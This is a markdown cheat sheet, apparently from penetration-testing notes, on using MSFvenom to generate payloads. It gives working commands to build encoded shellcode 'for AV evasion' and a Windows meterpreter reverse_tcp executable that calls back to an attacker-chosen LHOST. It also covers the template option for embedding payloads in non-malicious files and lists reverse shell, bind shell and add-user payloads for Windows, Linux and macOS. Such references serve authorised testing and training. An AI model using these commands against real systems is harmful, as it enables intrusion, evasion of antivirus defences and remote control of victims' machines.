# MSFvenom

For generation of payload shellcode and encoder for AV evasion.

A sample of MSFvenom command to generate shellcode of the bind\_tcp payload as below:

`msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python`

Architecture: `-a`

Platform: `--platform`

Payload to be use: `-p`

Encoding \(for AV evasion, often `x86/shikata_ga_nai` \): `-e`

Embed in non-malicious file by using a template: `-x`

Number of times to encode the payload: `-i`

Output format: `-f`

Help: `-h`

Variable \(default value is `buf`\): `-v`

Avoid bad character \(such as `'\x00'`\): `-b`

**List of Available Platform:**

> Cisco or cisco
>
> OSX or osx
>
> Solaris or solaris
>
> BSD or bsd
>
> OpenBSD or openbsd
>
> hardware
>
> Firefox or firefox
>
> BSDi or bsdi
>
> NetBSD or netbsd
>
> NodeJS or nodejs
>
> FreeBSD or freebsd
>
> Python or python
>
> AIX or aix
>
> JavaScript or javascript
>
> HPUX or hpux
>
> PHP or php
>
> Irix or irix
>
> Unix or unix
>
> Linux or linux
>
> Ruby or ruby
>
> Java or java
>
> Android or android
>
> Netware or netware
>
> Windows or windows
>
> mainframe
>
> multi

**List of Available formats:** `-help-format`

> asp, aspx, aspx-exe, dll, <span style="color:red">**elf**</span>, elf-so, <span style="color:red">**exe**, **exe-only**</span>, exe-service, exe-small,
>
> hta-psh, loop-vbs, <span style="color:red">**macho**</span>, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,
>
> psh-cmd, vba, vba-exe, vba-psh, vbs, war
>
> Transform formats
>
> bash, c, csharp, dw, dword, hex, java, js\_be, js\_le, num, perl, pl,
>
> powershell, ps1, py, python, raw, rb, ruby, sh,
>
> vbapplication, vbscript

Typical payloads
Sample command:
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe

Windows \(`-f exe`\)

| Shell |  | Arguments | 
| :--- | :--- |:--- |
| Reverse Shell | `windows/meterpreter/reverse_tcp` | LHOST, LPORT |
| Bind Shell | `windows/meterpreter/bind_tcp` | RHOST, LPORT|
| Create User | `windows/adduser USER=attacker PASS=attacker@123` | |
| CMD |  | LHOST, LPORT|
| Encoder | `-e shikata_ga_nai` | | 

Linux \(`-f elf`\)

| Shell |  |Arguments |
| :--- | :--- |:--- |
| Reverse Shell | `linux/x86/meterpreter/reverse_tcp` |LHOST, LPORT|
| Bind Shell | `linux/x86/meterpreter/bind_tcp` |RHOST, LPORT|
| Generic Shell | `generic/shell_bind_tcp` |RHOST, LPORT|

Mac OS \(`-f macho`\)

| Shell |  |Arguments|
| :--- | :--- |:--- |
| Reverse Shell | `osx/x86/shell_reverse_tcp` |LHOST, LPORT |
| Bind Shell | `osx/x86/shell_bind_tcp` |RHOST, LPORT |



